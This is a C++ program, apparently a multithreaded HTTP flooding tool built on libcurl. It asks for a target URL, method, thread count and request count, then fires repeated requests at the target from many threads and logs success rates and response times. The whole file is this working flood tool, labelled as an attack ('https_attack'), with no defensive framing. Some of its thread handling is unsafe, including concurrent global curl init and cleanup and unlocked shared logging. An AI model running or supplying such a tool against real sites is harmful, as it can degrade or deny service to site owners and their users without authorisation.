#include <iostream>
#include <fstream>
#include <sstream>
#include <vector>
#include <thread>
#include <chrono>
#include <curl/curl.h>

using namespace std;
using namespace chrono;

#define CYAN    "\033[1;36m"
#define GREEN   "\033[1;32m"
#define RED     "\033[1;31m"
#define RESET   "\033[0m"

void https_attack(const string& url, const string& method, int id, int count, ofstream& log) {
    CURL *curl;
    CURLcode res;
    int success = 0;
    double total_time = 0;

    curl_global_init(CURL_GLOBAL_ALL);
    for (int i = 0; i < count; i++) {
        curl = curl_easy_init();
        if(curl) {
            curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
            curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, method.c_str());
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, NULL);
            curl_easy_setopt(curl, CURLOPT_NOPROGRESS, 1L);
            curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);

            auto start = high_resolution_clock::now();
            res = curl_easy_perform(curl);
            auto end = high_resolution_clock::now();

            if(res == CURLE_OK) {
                success++;
                double rtt = duration_cast<milliseconds>(end - start).count();
                total_time += rtt;
                cout << GREEN << "[T" << id << "] HTTPS OK (" << rtt << "ms)" << RESET << endl;
            } else {
                cout << RED << "[T" << id << "] Failed: " << curl_easy_strerror(res) << RESET << endl;
            }
            curl_easy_cleanup(curl);
        }
    }
    curl_global_cleanup();

    double avg_time = (count > 0) ? total_time / count : 0;
    log << "[Thread " << id << "] Success: " << success << ", Avg RTT: " << avg_time << "ms\n";
}

int main() {
    string url, method;
    int threads, per_thread;

    cout << CYAN << "[+] Target full URL (e.g. https://example.com): " << RESET;
    cin >> url;
    cout << CYAN << "[+] Method (GET/POST/HEAD): " << RESET;
    cin >> method;
    cout << CYAN << "[+] Threads: " << RESET;
    cin >> threads;
    cout << CYAN << "[+] Requests per thread: " << RESET;
    cin >> per_thread;

    ofstream log("https_attack_metrics.log");
    vector<thread> workers;
    for (int i = 0; i < threads; i++) {
        workers.emplace_back(https_attack, url, method, i + 1, per_thread, ref(log));
    }
    for (auto& t : workers) t.join();
    log.close();

    cout << GREEN << "[✔] HTTPS test complete. Log saved to https_attack_metrics.log" << RESET << endl;
    return 0;
}
